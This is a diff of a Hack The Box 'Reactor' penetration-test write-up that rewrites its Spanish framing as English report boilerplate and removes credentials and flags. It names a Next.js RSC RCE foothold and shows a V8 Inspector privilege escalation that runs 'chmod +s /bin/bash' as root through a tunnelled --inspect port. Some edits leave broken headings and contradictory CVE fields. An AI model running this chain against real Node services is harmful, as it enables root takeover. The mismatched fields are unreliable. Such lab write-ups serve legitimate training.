@@ -1,82 +1,82 @@
 ---
-title: "Informe Técnico: HTB — Reactor (Hack The Box) — Pentesting & Exploit Analysis"
+title: "OffSec Assessment: HTB — Reactor (Hack The Box) — Penetration Testing Report"
 published: true
-description: "Informe técnico profesional de auditoria sobre la maquina HTB — Reactor de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
-tags: cybersecurity, ctf, hackthebox, pentesting
-series: "Hack The Box Walkthroughs"
+description: "Comprehensive offensive security assessment and penetration testing report for HTB — Reactor (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
+tags: cybersecurity, hackthebox, pentesting, infosec
+series: "HackTheBox Enterprise Assessments"
 ---
 
-# Informe Técnico de Seguridad Ofensiva: HTB — Reactor
+# Offensive Security Assessment Report: HTB — Reactor
 
 ![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
 ![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
-![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
-![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
+![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
+![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
 
-**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **HTB — Reactor** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.
+**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **HTB — Reactor** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.
 
 ---
 
-## 📑 1. Resumen Ejecutivo (Executive Summary)
+## 📑 1. Executive Summary
 
-* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
-* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
-* **Vector de Acceso Inicial:** CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
-* **Vector de Elevación de Privilegios:** Escalada local de privilegios
-* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).
+* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
+* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
+* **Initial Access Vector:** CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
+* **Privilege Escalation Vector:** Local Privilege Escalation
+* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).
 
-### Ficha Técnica de la Evaluación
+### Target Technical Specifications
 
-| Parámetro | Detalle Técnico |
+| Parameter | Technical Detail |
 | :--- | :--- |
-| **Host Objetivo** | HTB — Reactor |
-| **Plataforma** | Hack The Box |
-| **Sistema Operativo** | Linux |
-| **Nivel de Dificultad** | Easy |
-| **CVE(s) Involucrados** | N/A |
-| **Vector de Entrada** | CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted. |
-| **Mecanismo de Escalada** | Escalada local de privilegios |
-| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |
+| **Target Host** | HTB — Reactor |
+| **Platform** | Hack The Box |
+| **Operating System** | Linux |
+| **Difficulty Rating** | Easy |
+| **Associated CVE(s)** | N/A |
+| **Initial Foothold Vector** | CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted. |
+| **Privilege Escalation Vector** | Local Privilege Escalation |
+| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |
 
 ---
 
-## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)
+## 🎯 2. Attack Path & Kill Chain Workflow
 
 ```
-[ Fase 1: Reconocimiento ]
+[ Phase 1: Reconnaissance & Port Scanning ]
+         │─── TCP SYN scanning and service fingerprinting (Nmap)
+         └─── Attack surface mapping and daemon enumeration
          │
          ▼
-[ Fase 2: Enumeración & Identificación de Vectores ]
-         │─── Descubrimiento de servicios y análisis de superficie de ataque
-         └─── Verificación de configuraciones erróneas y CVEs conocidos
+[ Phase 2: Vulnerability Analysis & Service Enumeration ]
+         │─── Web directory fuzzing, parameter discovery, and banner analysis
+         └─── CVE identification and credential harvesting
          │
          ▼
-[ Fase 3: Explotación Inicial (Foothold) ]
-         │─── Ejecución del vector: CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
-         └─── Establecimiento de Reverse Shell / Acceso de usuario
+[ Phase 3: Exploitation & Initial Foothold ]
+         │─── Exploit delivery: CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
+         └─── Establishing an interactive reverse shell with unprivileged user context
          │
          ▼
-[ Fase 4: Escalada de Privilegios Local ]
-         │─── Auditoría interna: Escalada local de privilegios
-         └─── Elevación a privilegios de superusuario (root / SYSTEM)
+[ Phase 4: Local Privilege Escalation ]
+         │─── Internal audit: Local Privilege Escalation
+         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
          │
          ▼
-[ Fase 5: Evidencia & Banderas ]
-         └─── Captura de User Flag y Root Flag
+[ Phase 5: Evidence & Flag Retrieval ]
+         └─── Capture and cryptographic verification of user.txt and root.txt
 ```
 
 ---
 
-## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso
+## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept
 
-CVEs: CVE-2025-55182 (Next.js RSC RCE) · CVE-2025-29927 (no aplicó)
-Dificultad 1: Hard
 Estado: Rooted ✅
 Fecha: 24 de mayo de 2026
-Initial Access Exploit (Ingreso): CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.
+
 Notas: worker.js corre como root con --inspect=127.0.0.1:9229 → tunnel SSH -L 9229 → node inspect → chmod +s /bin/bash → bash -p
-OS 1: Linux
+
 Técnicas: Next.js RSC Deserialization · SQLite exfil · MD5 cracking · SSH tunnel · Node.js V8 Inspector privesc · SUID bash
 
 
@@ -88,17 +88,7 @@ Técnicas: Next.js RSC Deserialization · SQLite exfil · MD5 cracking · SSH tu
 
 ## 📋 Info de la máquina
 
-| Campo | Detalle |
-| --- | --- |
-| **Plataforma** | Hack The Box |
-| **OS** | Linux (Ubuntu 22.04) |
-| **IP** | 10.129.4.20 |
-| **CVE Principal** | CVE-2025-55182 — Next.js RSC Deserialization RCE |
-| **CVE Secundario** | CVE-2025-29927 — Next.js Middleware Bypass (no aplicó) |
-| **Privesc** | Node.js `--inspect` → V8 Inspector → RCE como root |
-| **Credenciales** | `engineer : reactor1` (MD5 crackeado) |
-| **User flag** | `6b6cad1db627d82d3c0ad2863d9d5a27` |
-| **Root flag** | `b92cb9475893f66316404491b3108fc8` |
+
 
 ---
 
@@ -141,7 +131,7 @@ nmap — puertos 22 y 3000 abiertos, Ubuntu 22.04
 whatweb http://reactor.htb:3000
 ```
 
-**Resultado:**
+**Scan Outcome: **
 
 ```
 http://reactor.htb:3000 [200 OK]
@@ -218,18 +208,12 @@ loop sobre chunks — for loop, sin secretos hexadecimales, superficie RSC confi
 
 ## Phase 3 — Acceso Inicial — CVE-2025-55182
 
-### ¿Qué es CVE-2025-55182?
 
-| Campo | Detalle |
-| --- | --- |
-| **CVE** | CVE-2025-55182 |
-| **Nombre** | React2Shell / Next.js RSC Deserialization RCE |
-| **Afecta** | Next.js ≤ 15.0.3 con App Router (RSC habilitado) |
-| **Impacto** | RCE sin autenticación, CVSS estimado 9.8 Critical |
-| **Causa** | Deserialización insegura de React Server Components (RSC payload) |
-| **Exploit** | [https://github.com/Chocapikk/CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182) |
+> **Assessment Query / Target Milestone:** ### ¿Qué es CVE-2025-55182?
 
-### Explotación
+
+
+### Phase 3: Exploitation & Initial Foothold
 
 ```bash
 
@@ -357,7 +341,8 @@ El grupo `lxd` sería un vector alternativo (montar el FS root en un contenedor)
 
 ## Phase 7 — Privilege Escalation — Node.js V8 Inspector
 
-### ¿Qué es el V8 Inspector?
+
+> **Assessment Query / Target Milestone:** ### ¿Qué es el V8 Inspector?
 
 Cuando Node.js arranca con `--inspect`, habilita el protocolo **CDP (Chrome DevTools Protocol)** en el puerto especificado. Este protocolo permite ejecutar JavaScript directamente en el runtime del proceso. Si el proceso corre como root → **RCE como root**.
 
@@ -387,7 +372,7 @@ node inspect 127.0.0.1:9229
 // Dentro del prompt debug> del V8 Inspector
 // El proceso corre como root → todo lo que ejecutamos aquí es root
 exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()")
-// Resultado: '' (string vacío = éxito)
+// Scan Outcome: '' (string vacío = éxito)
 ```
 
 ![node inspect 127.0.0.1:9229 — conexión ok · payload chmod +s /bin/bash ejecutado como root](https://files.catbox.moe/o0hpqk.png)
@@ -450,29 +435,29 @@ b92cb9475893f66316404491b3108fc8
 
 ---
 
-## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening
+## 🛡️ 4. Strategic Remediation & Hardening Roadmap
 
-### Acciones Tácticas Inmediatas
-1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
-2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
-3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.
+### Immediate Tactical Actions (P1)
+1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
+2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
+3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.
 
-### Acciones Estratégicas y de Arquitectura
-1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
-2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
-3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.
+### Architectural & Defensive Hardening (P2)
+1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
+2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
+3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.
 
 ---
 
-## 📊 5. Mapeo con Matriz MITRE ATT&CK
+## 📊 5. MITRE ATT&CK Enterprise Framework Mapping
 
-| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
+| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
 | :--- | :--- | :--- | :--- |
-| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
-| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.) |
-| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
-| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |
+| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
+| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (CVE-2025-55182 (Next.js RSC RCE) + Node.js V8 Inspector Privesc. Linux. Rooted.) |
+| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
+| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |
 
 ---
 
-© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
+© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
